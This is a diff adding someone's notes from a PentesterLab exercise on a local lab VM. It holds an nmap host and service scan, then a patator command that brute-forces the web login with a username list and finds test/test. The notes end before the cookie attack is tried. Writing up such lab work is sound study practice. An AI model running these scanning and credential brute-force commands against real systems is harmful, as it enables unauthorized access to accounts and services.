@@ -1,0 +1,45 @@
+Sassinak:~ warrenkopp$ nmap -sP 192.168.56.0/24
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2016-03-09 18:48 EST
+Nmap scan report for 192.168.56.101
+Host is up (0.0015s latency).
+Nmap done: 256 IP addresses (1 host up) scanned in 21.70 seconds
+
+Sassinak:~ warrenkopp$ nmap -sV 192.168.56.101
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2016-03-09 18:48 EST
+Nmap scan report for 192.168.56.101
+Host is up (0.0038s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.5p1 Debian 6+squeeze2 (protocol 2.0)
+53/tcp open  domain  ISC BIND 9.7.3
+80/tcp open  http    Apache httpd 2.2.16 ((Debian))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.52 seconds
+
+http://192.168.56.101 redirects to 192.168.56.101/login
+a form with login & password fields. 
+
+https://pentesterlab.com/exercises/rack_cookies_and_commands_injection/course
+
+# tutorial recommends https://github.com/lanjelot/patator
+# successful execution required editing #!/usr/bin/env python2 to 
+# #!/usr/bin/env python and installing pycurl. 
+
+Sassinak:patator warrenkopp$ ./patator.py http_fuzz url=http://192.168.56.101/login method=POST body='login=FILE0&password=FILE0' 0=~/githubs/seclists/Usernames/top_shortlist.txt accept_cookie=1 follow=1 -x ignore:fgrep='DNS Manager Login' -l /tmp/patator
+19:12:08 patator    INFO - Starting Patator v0.7-beta (https://github.com/lanjelot/patator) at 2016-03-09 19:12 EST
+19:12:08 patator    INFO -                                                                              
+19:12:08 patator    INFO - code size:clen       time | candidate                          |   num | mesg
+19:12:08 patator    INFO - -----------------------------------------------------------------------------
+19:12:08 patator    INFO - 200  5686:1714      0.110 | test                               |     3 | HTTP/1.1 200 OK
+19:12:08 patator    INFO - Hits/Done/Skip/Fail/Size: 1/13/0/0/13, Avg: 25 r/s, Time: 0h 0m 0s
+
+login with test/test
+
+# meta : build python script to read dictionary, send http, read response, repeat
+
+# need to reverse the rack session cookie, which requires working knowledge of both ruby and the webserver code. 
+# thanks but no thanks. I can barely comprehend python atm. 
